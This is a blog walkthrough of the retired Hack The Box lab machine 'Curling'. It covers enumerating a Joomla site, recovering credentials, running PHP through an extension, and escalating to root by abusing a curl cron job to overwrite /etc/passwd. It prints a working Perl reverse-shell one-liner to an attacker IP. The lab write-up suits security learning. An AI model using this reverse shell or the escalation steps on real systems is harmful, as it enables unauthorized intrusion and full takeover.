---
layout: post
title: "Curling: Hack The Box Walkthrough"
date: 2019-03-30 15:46:14 +0000
last_modified_at: 2019-03-30 15:46:24 +0000s
category: Walkthrough
tags: ["Hack The Box", Curling, retired]
comments: true
image:
  feature: curling-htb-walkthrough.jpg
  credit: Shabbytochicnz / Pixabay
  creditlink: https://pixabay.com/en/curling-bonspiel-winter-sport-ice-882649/
---

This post documents the complete walkthrough of Curling, a retired vulnerable [VM][1] created by [L4mpje][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

### Background

Curling is a retired vulnerable VM from Hack The Box.

### Information Gathering

Let’s start with a `nmap` scan to establish the available services in the host.

```
# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 10.10.10.150
...
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
```

Let's start with the `http` service. This is how it looks like in a browser.

<a class="image-popup">
![8551cc0f.png](/assets/images/posts/curling-htb-walkthrough/8551cc0f.png)
</a>

### Directory/File Enumeration

Let's use `wfuzz` and SecLists' `quickhits.txt`, and see what we can get.

```
# wfuzz -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt --hc '403,404' http://10.10.10.150/FUZZ
********************************************************
* Wfuzz 2.3.1 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.150/FUZZ
Total requests: 2371

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000600:  C=200    109 L      348 W         5110 Ch        "/administrator/"
000603:  C=301      9 L       28 W          325 Ch        "/administrator/logs"
000825:  C=200      1 L        2 W           31 Ch        "/cache/"
000966:  C=200      0 L        0 W            0 Ch        "/configuration.php"
001306:  C=200     80 L      493 W         3005 Ch        "/htaccess.txt"
001444:  C=200    339 L     2968 W        18092 Ch        "/LICENSE.txt"
001915:  C=200     72 L      540 W         4872 Ch        "/README.txt"
002101:  C=200      1 L        2 W           31 Ch        "/templates/"
002138:  C=301      9 L       28 W          310 Ch        "/tmp"
002139:  C=200      1 L        2 W           31 Ch        "/tmp/"
002270:  C=200     31 L       90 W         1690 Ch        "/web.config.txt"

Total time: 48.42746
Processed Requests: 2371
Filtered Requests: 2360
Requests/sec.: 48.95982
```

Now, what do we have here? Joomla!

<a class="image-popup">
![12613c27.png](/assets/images/posts/curling-htb-walkthrough/12613c27.png)
</a>

### Joomla 3.8

If you look at the articles posted, the first article was signed off by Floris and written by Super User. Could `floris` be the username? And, what's the password?

Hidden at the bottom of the HTML source code of the landing page is a HTML comment that looks like this.

<a class="image-popup">
![6ec7edb7.png](/assets/images/posts/curling-htb-walkthrough/6ec7edb7.png)
</a>

Hmm. It seems to suggest the presence of a `secret.txt` file. Let's check it out.

<a class="image-popup">
![8ebdadd4.png](/assets/images/posts/curling-htb-walkthrough/8ebdadd4.png)
</a>

That's the `base64`-encoding of the string `Curling2018!`.

<a class="image-popup">
![a92bf554.png](/assets/images/posts/curling-htb-walkthrough/a92bf554.png)
</a>

Could this be the password? There's only one way to find out.

<a class="image-popup">
![40671766.png](/assets/images/posts/curling-htb-walkthrough/40671766.png)
</a>

The credential is indeed (`floris:Curling2018!`) and a Super User no less.

### Low-Privilege Shell

Searching for "writing joomla article in php" in Google led me to [Sourcerer](https://www.regularlabs.com/extensions/sourcerer), a Joomla extension that allows one to write in any code, more importantly in PHP. And since I'm the Super User, installing an extension is a breeze. Go to Extensions->Manage->Install.

<a class="image-popup">
![95c16f02.png](/assets/images/posts/curling-htb-walkthrough/95c16f02.png)
</a>

Upload the extension and you are done.

<a class="image-popup">
![d1fda8ec.png](/assets/images/posts/curling-htb-walkthrough/d1fda8ec.png)
</a>

Now, log in to the landing page with the same credential and go back to one of the articles already posted; and add some PHP code like this.

<a class="image-popup">
![b1c12ee0.png](/assets/images/posts/curling-htb-walkthrough/b1c12ee0.png)
</a>

Save the article and go to the article's canonical URL.

<a class="image-popup">
![0e4516a9.png](/assets/images/posts/curling-htb-walkthrough/0e4516a9.png)
</a>

Isn't this awesome? We are now ready for a reverse shell. I always like Perl because it's more likely to be present than Python.

```
perl -e 'use Socket;$i="10.10.14.109";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

[URLencode](https://en.wikipedia.org/wiki/Percent-encoding) it to prevent complications since we are putting in the address bar.

Meanwhile at my `nc` listener, a reverse shell appears...

<a class="image-popup">
![255ebd1e.png](/assets/images/posts/curling-htb-walkthrough/255ebd1e.png)
</a>

### Privilege Escalation

During enumeration of `www-data`'s account, I notice an interesting file `password_backup` at `/home/floris`. The `user.txt` is here but only `floris` can read it.

<a class="image-popup">
![a6623416.png](/assets/images/posts/curling-htb-walkthrough/a6623416.png)
</a>

The file `password_backup` is a hexdump.

<a class="image-popup">
![f38ab22b.png](/assets/images/posts/curling-htb-walkthrough/f38ab22b.png)
</a>

Let's restore the hexdump back to its binary form and see what's next with `file`.

<a class="image-popup">
![4aae9715.png](/assets/images/posts/curling-htb-walkthrough/4aae9715.png)
</a>

Let's try the credential (`floris:5d<wdCbdZu)|hChXll`) with SSH.

<a class="image-popup">
![1fca6a37.png](/assets/images/posts/curling-htb-walkthrough/1fca6a37.png)
</a>

Perfect. Time to retrieve `user.txt`.

<a class="image-popup">
![31cbe022.png](/assets/images/posts/curling-htb-walkthrough/31cbe022.png)
</a>

Now, I notice something really strange going on in `/admin-area`.

<a class="image-popup">
![3a223cec.png](/assets/images/posts/curling-htb-walkthrough/3a223cec.png)
</a>

Two files are written here by `root` at every minute interval! If I have to guess, I would say that a `cron` job is ran by `root` every minute writing the files here.

The file `input` contains `curl`-like argument like this.

<a class="image-popup">
![7a809141.png](/assets/images/posts/curling-htb-walkthrough/7a809141.png)
</a>

If that's the case, I can change the content to this.

```
url = "file:///tmp/passwd"
output = "/etc/passwd"
```

This input will tell `curl` to download the file at `/tmp/passwd` and write it to `/etc/passwd`. Now, let's copy `/etc/passwd` to `/tmp/passwd` and add another `root` account like so.

<a class="image-popup">
![1a567305.png](/assets/images/posts/curling-htb-walkthrough/1a567305.png)
</a>

Where `to5bce5sr7eK6` is the `crypt(3)` hash or one-way digest of "toor" with salt "toor".

Once that's done, we can proceed to modify `input` and log in as `toor` a minute later.

<a class="image-popup">
![f2bb1de7.png](/assets/images/posts/curling-htb-walkthrough/f2bb1de7.png)
</a>

Getting `root.txt` is next to trivial.

<a class="image-popup">
![320937c1.png](/assets/images/posts/curling-htb-walkthrough/320937c1.png)
</a>

:dancer:

[1]: https://www.hackthebox.eu/home/machines/profile/160
[2]: https://www.hackthebox.eu/home/users/profile/29267
[3]: https://www.hackthebox.eu/
